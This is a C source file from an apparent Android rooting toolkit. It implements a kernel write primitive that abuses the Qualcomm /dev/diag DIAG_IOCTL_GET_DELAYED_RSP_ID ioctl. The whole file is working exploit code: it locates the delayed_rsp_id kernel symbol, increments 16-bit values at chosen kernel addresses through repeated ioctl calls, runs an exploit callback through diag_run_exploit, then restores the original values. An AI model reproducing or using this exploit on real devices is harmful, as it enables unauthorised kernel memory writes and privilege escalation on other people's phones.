/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <device_database.h>

#include "diag.h"

static void *
get_delayed_rsp_id_addresses(void)
{
  void *value;

  value = (void *)device_get_symbol_address(DEVICE_SYMBOL(delayed_rsp_id));
  if (value) {
    return value;
  }

  print_reason_device_not_supported();

  return NULL;
}

#define DIAG_IOCTL_GET_DELAYED_RSP_ID   8
struct diagpkt_delay_params {
  void *rsp_ptr;
  int size;
  int *num_bytes_ptr;
};

static int
send_delay_params(int fd, void *target_address, void *stored_for_written_bytes)
{
  int ret;
  struct diagpkt_delay_params params;

  params.rsp_ptr = target_address;
  params.size = 2;
  params.num_bytes_ptr = stored_for_written_bytes;

  ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &params);
  if (ret < 0) {
    printf("failed to ioctl due to %s.\n", strerror(errno));
  }
  return ret;
}

static int
reset_delayed_rsp_id(int fd, void *delayed_rsp_id_address)
{
  uint16_t unused;

  return send_delay_params(fd, &unused, delayed_rsp_id_address);
}

static int
get_current_delayed_rsp_id(int fd)
{
  int ret;
  uint16_t delayed_rsp_id = 0;
  int unused;

  ret = send_delay_params(fd, &delayed_rsp_id, &unused);
  if (ret < 0) {
    return ret;
  }
  return delayed_rsp_id;
}

static bool
inject_value(struct diag_values *data,
             int fd, void *delayed_rsp_id_address)
{
  uint16_t delayed_rsp_id_value = 0;
  int i, loop_count, ret;

  ret = get_current_delayed_rsp_id(fd);
  if (ret < 0) {
    return false;
  }
  delayed_rsp_id_value = ret;
  data->original_value = delayed_rsp_id_value;

  if (delayed_rsp_id_value > data->value &&
    reset_delayed_rsp_id(fd, delayed_rsp_id_address) < 0) {
    return false;
  }

  loop_count = (data->value - delayed_rsp_id_value) & 0xffff;

  for (i = 0; i < loop_count; i++) {
    int unused;
    if (send_delay_params(fd, (void *)data->address, &unused) < 0) {
      return false;
    }
  }
  return true;
}

bool
diag_inject(struct diag_values *data, int data_length)
{
  int fd;
  bool ret;

  fd = open("/dev/diag", O_RDWR);
  if (fd < 0) {
    printf("failed to open /dev/diag due to %s.\n", strerror(errno));
    return false;
  }

  ret = diag_inject_with_fd(data, data_length, fd);

  close(fd);

  return ret;
}

bool
diag_inject_with_fd(struct diag_values *data, int data_length, int fd)
{
  int i;
  void *delayed_rsp_id_address;
  int16_t dummy_delayed_rsp_id_address = 0;

  delayed_rsp_id_address = get_delayed_rsp_id_addresses();
  if (!delayed_rsp_id_address) {
    printf("Attempting to inject code...\n");
    printf("This works only once a boot.\n");
    delayed_rsp_id_address = &dummy_delayed_rsp_id_address;
  }

  for (i = 0; i < data_length; i++) {
    if (!inject_value(&data[i], fd, delayed_rsp_id_address)) {
      return false;
    }
  }

  return true;
}

bool
diag_is_supported(void)
{
  return get_delayed_rsp_id_addresses() != NULL;
}

static bool
restore_values(struct diag_values *data, int data_length, int fd)
{
  int i;
  void *delayed_rsp_id_address;

  delayed_rsp_id_address = get_delayed_rsp_id_addresses();
  if (!delayed_rsp_id_address) {
    printf("Can't restore values because delayed_rsp_id address is unknown.\n");
    return false;
  }

  for (i = 0; i < data_length; i++) {
    data[i].value = data[i].original_value + 1;
    if (!inject_value(&data[i], fd, delayed_rsp_id_address)) {
      return false;
    }
  }

  return true;
}

bool
diag_run_exploit(struct diag_values *data, int data_length,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  bool success;
  int fd;

  fd = open("/dev/diag", O_RDWR);
  if (fd < 0) {
    printf("failed to open /dev/diag due to %s.\n", strerror(errno));
    return false;
  }

  success = diag_inject_with_fd(data, data_length, fd);

  if (success) {
    success = exploit_callback(user_data);
    restore_values(data, data_length, fd);
  }

  close(fd);

  return success;
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
